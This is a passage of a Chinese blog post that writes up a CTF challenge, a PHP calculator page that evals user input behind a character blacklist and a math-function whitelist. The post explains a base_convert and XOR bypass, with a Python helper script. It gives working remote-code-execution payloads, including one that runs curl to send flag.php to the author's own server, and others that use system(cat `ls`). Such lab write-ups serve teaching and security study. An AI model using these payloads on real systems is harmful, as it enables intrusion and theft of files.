</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-28>28</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>); 
</span></span><span style=display:flex><span><span style=color:#75715e>//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;c&#39;</span>])){ 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>); 
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{ 
</span></span><span style=display:flex><span>    <span style=color:#75715e>//例子 c=20-1 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $content <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;c&#39;</span>]; 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strlen</span>($content) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>80</span>) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;太长了不会算&#34;</span>); 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>    $blacklist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39; &#39;</span>, <span style=color:#e6db74>&#39;\t&#39;</span>, <span style=color:#e6db74>&#39;\r&#39;</span>, <span style=color:#e6db74>&#39;\n&#39;</span>,<span style=color:#e6db74>&#39;\&#39;&#39;</span>, <span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;`&#39;</span>, <span style=color:#e6db74>&#39;\[&#39;</span>, <span style=color:#e6db74>&#39;\]&#39;</span>]; 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> ($blacklist <span style=color:#66d9ef>as</span> $blackitem) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $blackitem <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/m&#39;</span>, $content)) { 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;请不要输入奇奇怪怪的字符&#34;</span>); 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>    <span style=color:#75715e>//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $whitelist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;abs&#39;</span>, <span style=color:#e6db74>&#39;acos&#39;</span>, <span style=color:#e6db74>&#39;acosh&#39;</span>, <span style=color:#e6db74>&#39;asin&#39;</span>, <span style=color:#e6db74>&#39;asinh&#39;</span>, <span style=color:#e6db74>&#39;atan2&#39;</span>, <span style=color:#e6db74>&#39;atan&#39;</span>, <span style=color:#e6db74>&#39;atanh&#39;</span>, <span style=color:#e6db74>&#39;base_convert&#39;</span>, <span style=color:#e6db74>&#39;bindec&#39;</span>, <span style=color:#e6db74>&#39;ceil&#39;</span>, <span style=color:#e6db74>&#39;cos&#39;</span>, <span style=color:#e6db74>&#39;cosh&#39;</span>, <span style=color:#e6db74>&#39;decbin&#39;</span>, <span style=color:#e6db74>&#39;dechex&#39;</span>, <span style=color:#e6db74>&#39;decoct&#39;</span>, <span style=color:#e6db74>&#39;deg2rad&#39;</span>, <span style=color:#e6db74>&#39;exp&#39;</span>, <span style=color:#e6db74>&#39;expm1&#39;</span>, <span style=color:#e6db74>&#39;floor&#39;</span>, <span style=color:#e6db74>&#39;fmod&#39;</span>, <span style=color:#e6db74>&#39;getrandmax&#39;</span>, <span style=color:#e6db74>&#39;hexdec&#39;</span>, <span style=color:#e6db74>&#39;hypot&#39;</span>, <span style=color:#e6db74>&#39;is_finite&#39;</span>, <span style=color:#e6db74>&#39;is_infinite&#39;</span>, <span style=color:#e6db74>&#39;is_nan&#39;</span>, <span style=color:#e6db74>&#39;lcg_value&#39;</span>, <span style=color:#e6db74>&#39;log10&#39;</span>, <span style=color:#e6db74>&#39;log1p&#39;</span>, <span style=color:#e6db74>&#39;log&#39;</span>, <span style=color:#e6db74>&#39;max&#39;</span>, <span style=color:#e6db74>&#39;min&#39;</span>, <span style=color:#e6db74>&#39;mt_getrandmax&#39;</span>, <span style=color:#e6db74>&#39;mt_rand&#39;</span>, <span style=color:#e6db74>&#39;mt_srand&#39;</span>, <span style=color:#e6db74>&#39;octdec&#39;</span>, <span style=color:#e6db74>&#39;pi&#39;</span>, <span style=color:#e6db74>&#39;pow&#39;</span>, <span style=color:#e6db74>&#39;rad2deg&#39;</span>, <span style=color:#e6db74>&#39;rand&#39;</span>, <span style=color:#e6db74>&#39;round&#39;</span>, <span style=color:#e6db74>&#39;sin&#39;</span>, <span style=color:#e6db74>&#39;sinh&#39;</span>, <span style=color:#e6db74>&#39;sqrt&#39;</span>, <span style=color:#e6db74>&#39;srand&#39;</span>, <span style=color:#e6db74>&#39;tan&#39;</span>, <span style=color:#e6db74>&#39;tanh&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>preg_match_all</span>(<span style=color:#e6db74>&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span>, $content, $used_funcs); 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> ($used_funcs[<span style=color:#ae81ff>0</span>] <span style=color:#66d9ef>as</span> $func) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($func, $whitelist)) { 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;请不要输入奇奇怪怪的函数&#34;</span>); 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>    <span style=color:#75715e>//帮你算出答案 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;echo &#39;</span><span style=color:#f92672>.</span>$content<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;;&#39;</span>); 
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>通过base_convert将十进制转三十六进制，可以得到小写字母和数字共三十六种字符，再通过异或、与、或进一步得到更大的字符集。受限于总长度为小于80个字符，将base_convert赋值给pi方便重复使用。</p><p>遍历发现<code>123456789abcdefghijklmnopqrstuvwxyz</code> 和<code>123456789abcdefghijklmnopqrstuvwxyz</code> 按位异或可得到可打印字符集<code>A@CBEDGFIHKJMLONQPSRUTWVYX[Z]\_^</code> ，可以构造出<code>_GET</code> 。使用花括号取偏移，再使用exec执行命令，构造出等价于<code>exec($_GET{1})</code> 的payload。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>res<span style=color:#f92672>=</span>set()
</span></span><span style=display:flex><span>ii<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>jj<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;_GET&#34;</span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> cmd:
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> i,j <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(<span style=color:#e6db74>&#34;123456789abcdefghijklmnopqrstuvwxyz&#34;</span>,<span style=color:#e6db74>&#34;0123456789abcdefghijklmnopqrstuvwxyz&#34;</span>):
</span></span><span style=display:flex><span>		kk<span style=color:#f92672>=</span>chr(ord(i)<span style=color:#f92672>^</span>ord(j))
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> k<span style=color:#f92672>==</span>kk:
</span></span><span style=display:flex><span>			ii<span style=color:#f92672>=</span>ii<span style=color:#f92672>+</span>i
</span></span><span style=display:flex><span>			jj<span style=color:#f92672>+=</span>j
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>		res<span style=color:#f92672>.</span>add(kk)
</span></span><span style=display:flex><span>print ii,jj <span style=color:#75715e>#1111 nvte</span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(res) <span style=color:#75715e># A@CBEDPSRUTWVYX[Z]\_^</span>
</span></span></code></pre></td></tr></table></div></div><p>将<code>1111</code> 和<code>nvte</code> 作为36进制数，转为10进制数分别得到：47989和1114322。可以使用<a href=https://tool.lu/hexconvert/>在线工具</a>或PHP的base_convert函数转换。</p><p>最终访问路径为<code>calc.php?c=$pi=base_convert;$pi(696468,10,36)(${$pi(47989,10,36)^$pi(1114322,10,36)}{1})&amp;1=curl%20my.vps%20-F%20'data=@flag.php'</code> 。在服务端监听即可收到flag.php内容。</p><p>初步实现命令执行</p><p><img loading=lazy src=67796462f6ebbdfee.png alt></p><p>获取flag</p><p><img loading=lazy src=200082f31d39384a8.png alt></p><p>如果长度放宽一点，这些思路也许也可以：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span><span style=color:#a6e22e>system</span>(cat <span style=color:#f92672>`</span>ls<span style=color:#f92672>`</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>pi<span style=color:#f92672>=</span>base_convert;<span style=color:#960050;background-color:#1e0010>$</span><span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>1751504350</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>)(<span style=color:#960050;background-color:#1e0010>$</span><span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>963893486026</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>)<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>$</span><span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>963910328843</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>(cat <span style=color:#960050;background-color:#1e0010>$</span>(ls))
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>pi<span style=color:#f92672>=</span>base_convert;<span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>1751504350</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>)(<span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>573877</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>)<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>pi</span>(<span style=color:#ae81ff>573887</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>)<span style=color:#960050;background-color:#1e0010>$</span>(<span style=color:#a6e22e>pi</span>((<span style=color:#ae81ff>784</span>,<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>36</span>))))
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/210225-burp-advanced-trick/><span class=title>« Prev</span><br><span>burp进阶技巧</span></a>
<a class=next href=https://ret2neo.cn/post/190326-clock-manage-problem/><span class=title>Next »</span><br><span>拨钟问题</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>